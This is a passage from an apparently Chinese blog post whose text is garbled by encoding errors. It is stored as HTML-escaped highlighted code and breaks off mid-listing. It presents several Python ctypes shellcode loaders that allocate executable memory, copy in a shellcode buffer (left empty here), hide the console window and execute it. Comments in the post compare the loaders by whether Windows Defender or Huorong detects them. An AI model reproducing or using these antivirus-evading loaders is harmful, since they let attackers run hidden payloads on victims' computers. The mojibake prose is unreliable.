&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WaitForSingleObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ht&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;ç¬¬äºŒç§&#34;&gt;ç¬¬äºŒç§&lt;/h3&gt;
&lt;p&gt;64ä½æµ‹è¯•å¤±è´¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;ctypes&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode_one&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;create_string_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode_run&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cast&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode_one&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CFUNCTYPE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_void_p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode_run&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;ç¬¬ä¸‰ç§&#34;&gt;ç¬¬ä¸‰ç§&lt;/h3&gt;
&lt;p&gt;64ä½æµ‹è¯•å¤±è´¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;ctypes&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;ctypes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#libc = CDLL(&amp;#39;libc.so.6&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PROT_READ&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PROT_WRITE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PROT_EXEC&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;executable_code&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c_char_p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;size&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;valloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c_void_p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;raise&lt;/span&gt; &lt;span class=&#34;ne&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Failed to allocate memory&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;memmove&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mprotect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PROT_READ&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PROT_WRITE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PROT_EXEC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;raise&lt;/span&gt; &lt;span class=&#34;ne&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Failed to set protection on buffer&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;VirtualAlloc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualAlloc&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;VirtualProtect&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualProtect&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;bytearray&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;whnd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GetConsoleWindow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;whnd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ShowWindow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;whnd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CloseHandle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;whnd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;memorywithshell&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                          &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                          &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x3000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                          &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x40&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;from_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;old&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_long&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;VirtualProtect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memorywithshell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)),&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x40&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;byref&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;old&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RtlMoveMemory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memorywithshell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                     &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                     &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cast&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memorywithshell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CFUNCTYPE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_void_p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;ç¬¬å››ç§&#34;&gt;ç¬¬å››ç§&lt;/h3&gt;
&lt;p&gt;è¿™ä¸ªå¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼Œå¹¶ä¸”ä¸ä¼šè¢«å¾®è½¯é»˜è®¤æ€è½¯æ€æ‰ï¼Œä½†æ˜¯ä¼šè¢«ç«ç»’æŸ¥æ€ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;ctypes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
